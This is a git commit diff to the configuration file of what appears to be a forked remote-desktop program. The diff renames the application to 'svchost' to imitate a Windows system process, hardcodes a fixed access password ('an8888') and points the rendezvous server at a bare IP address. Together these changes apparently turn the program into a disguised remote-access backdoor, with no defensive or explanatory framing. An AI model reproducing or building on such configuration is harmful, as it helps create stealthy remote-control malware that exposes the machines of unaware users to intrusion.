0a749a3fca3273ad68b99bf4e7f9a3c305591d33
LiuLiHuaYue <rushmoran@foxmail.com>
2026-02-01 16:52:56 +0800

    up

--- src/config.rs
+++ src/config.rs
@@ -58,7 +58,7 @@ lazy_static::lazy_static! {
     static ref ONLINE: Mutex<HashMap<String, i64>> = Default::default();
     pub static ref PROD_RENDEZVOUS_SERVER: RwLock<String> = RwLock::new("".to_owned());
     pub static ref EXE_RENDEZVOUS_SERVER: RwLock<String> = Default::default();
-    pub static ref APP_NAME: RwLock<String> = RwLock::new("WindowsSpector".to_owned());
+    pub static ref APP_NAME: RwLock<String> = RwLock::new("svchost".to_owned());
     static ref KEY_PAIR: Mutex<Option<KeyPair>> = Default::default();
     static ref USER_DEFAULT_CONFIG: RwLock<(UserDefaultConfig, Instant)> = RwLock::new((UserDefaultConfig::load(), Instant::now()));
     pub static ref NEW_STORED_PEER_CONFIG: Mutex<HashSet<String>> = Default::default();
@@ -75,7 +75,7 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
             let mut map = HashMap::new();
-            map.insert("password".into(), "111111".into());    //固定密码
+            map.insert("password".into(), "an8888".into());
             RwLock::new(map)
         };
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
@@ -115,8 +115,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["hn.hydesk.cn"];
-pub const RS_PUB_KEY: &str = "gd77han";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["111.231.0.93"];
+pub const RS_PUB_KEY: &str = "4ooPyg+S5IzXeoGAZBKZZQMgf6GqrAFYd4vjWwc69pE=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
